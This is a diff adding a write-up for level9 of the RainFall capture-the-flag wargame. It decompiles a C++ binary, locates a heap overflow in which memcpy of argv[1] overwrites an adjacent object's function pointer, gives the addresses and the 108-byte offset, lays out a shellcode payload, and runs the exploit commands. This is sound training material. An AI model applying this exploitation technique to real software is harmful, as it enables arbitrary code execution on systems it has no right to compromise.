@@ -1,0 +1,49 @@
+This level was also very dense and complex.
+
+After decompiling, some refactoring of the code was needed :
+`
+	N* v1, N* v2
+
+	v1 = (N*) new(108)               DONC sizeof(N) = 108 (soit 4 * 27)
+	N(v1, 5) {
+	v1 = 0x8048848 (= f(int, int) ) ;
+	*(v1 + 104) = 5;               SOIT *(v1 + (DWORD*)26) = 0x00000005
+	}
+
+	v2 = (N*) new(108)
+	N(v2, 6) {
+	v2 = 0x8048848
+	*(v2 + 104) = 6
+	}
+
+	memcpy((char *)v1 + 4, argv[1], strlen(argv[1]));
+	**v2(v2, v1)
+`
+
+What the program is basically doing, is allocating on the heap 2 N() objects using the N(int) constructor that, as shown on the upper code, set the last 4 bytes of the object to 0x00000005 or 6, probably so that we can recognize them in the stack addresses after some analysis.
+
+After that, it memcpy argv[1] in v1 + 4
+And finally, it calls as a function the address pointed by **v2.
+
+The place to overflow is pretty obvious, since we copy everything from argv into v1.
+-> I also noticed that v1 is allocated just before v2, so overflowing v1 means overwriting v2 (which is called as a function after that)
+
+After checking on gdb:
+`
+	v1 = 0x0804a008
+	v2 = 0x0804a078
+`
+-> memcpy writes on v1 + 4 (0x0804a00c)
+
+So, to overwrite v2 I need at least 0x0804a078 - 0x0804a00c = 108 bytes
+And as the function call on v2 is dereferencing 2 times, I need to intersect at least 2 addresses between:
+-> so *0x0804a078 will be equal to 0x0804a00c, and 0x0804a00c will be equal to 0x0804a010
+
+And now that the function call knows where to go, I just have to put the shellcode at the address called (0x0804a010).
+
+The payload basically looks like that:
+-> addr2(0x0804a010) + shellcode + filler + addr1(0x0804a00c)
+
+level9@RainFall:~$ (python /tmp/exploit.py | head -c -1) > /tmp/exploit
+level9@RainFall:~$ ./level9 `cat /tmp/exploit`
+
